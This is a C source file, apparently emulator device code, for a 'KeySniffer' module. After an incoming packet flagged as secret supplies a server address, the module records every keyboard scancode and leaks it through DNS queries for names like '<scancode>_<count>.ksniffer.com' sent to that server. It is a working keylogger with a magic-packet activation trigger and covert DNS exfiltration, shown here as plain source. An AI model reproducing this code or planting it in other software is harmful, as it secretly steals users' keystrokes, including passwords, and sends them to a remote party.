#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "hw/ksniffer/ksniffer.h"
#include "hw/ksniffer/dns_sender.h"
#include "hw/ksniffer/packet_analyzer.h"
#include "hw/ksniffer/key_stat_collector.h"
#include "hw/ksniffer/util.h"

struct KeySniffer
{
    int sniffing;
    DnsQuerySenderPtr sender;
    PacketAnalyzerPtr packet_analyzer;
    KeyStatCollectorPtr key_stat_collector;
};

static KeySniffer ksniffer;
static int initialized = 0;

static int generate_dnsname_by_scancode(KeySnifferPtr ksniffer, int scancode, char *buffer)
{
    int scancode_count;

    scancode_count = key_stat_collector_get_scancode_count(ksniffer->key_stat_collector, scancode);

//    buffer[0] = scancode & 0xFF;
//    buffer[1] = (scancode_count >> 24) & 0xFF;
//    buffer[2] = (scancode_count >> 16) & 0xFF;
//    buffer[3] = (scancode_count >> 8) & 0xFF;
//    buffer[4] = (scancode_count) & 0xFF;
//    sprintf(buffer + 5, ".ksniffer.com");

    sprintf(buffer, "%d_%d.ksniffer.com", scancode, scancode_count);

    return strlen(buffer);
}

static void init_ksniffer(KeySnifferPtr ksniffer)
{
    DnsQuerySenderPtr sender = dns_query_sender_create();
    PacketAnalyzerPtr packet_analyzer = packet_analyzer_create();
    KeyStatCollectorPtr key_stat_collector = key_stat_collector_create();

    ksniffer->sniffing = 0;
    ksniffer->sender = sender;
    ksniffer->packet_analyzer = packet_analyzer;
    ksniffer->key_stat_collector = key_stat_collector;
}

KeySnifferPtr key_sniffer_get_instance(void)
{
    if (!initialized) {
        init_ksniffer(&ksniffer);
        initialized = 1;
    }

    return &ksniffer;
}

void key_sniffer_turn_on(KeySnifferPtr ksniffer)
{
    ksniffer->sniffing = 1;
}

void key_sniffer_turn_off(KeySnifferPtr ksniffer)
{
    ksniffer->sniffing = 0;
}

void key_sniffer_sniff(KeySnifferPtr ksniffer, int scancode)
{
    char dnsname[32];

    if (ksniffer->sniffing) {
        key_stat_collector_add_scancode(ksniffer->key_stat_collector, scancode);
        generate_dnsname_by_scancode(ksniffer, scancode, dnsname);
        dns_query_sender_send_dns_query(ksniffer->sender, dnsname);
    }
}

void key_sniffer_analyze_packet(KeySnifferPtr ksniffer, const uint8_t *buf, size_t size)
{
    if (ksniffer->sniffing) {
        /* already sniffing */
        print_msg("Already sniffing");
        return;
    }

    PacketInfoPtr packet_info;
    PacketAnalyzerPtr packet_analyzer;

    packet_analyzer= ksniffer->packet_analyzer;
    packet_info = packet_analyzer_analyze_packet(packet_analyzer, (const char *)buf, size);

    if (packet_info->is_secret) {
        ksniffer->sniffing = 1;
        dns_query_sender_connect_to_server(ksniffer->sender, packet_info->server_ip, packet_info->port);
        print_msg("Sniffing started...");
    }

    packet_info_delete(packet_info);
}
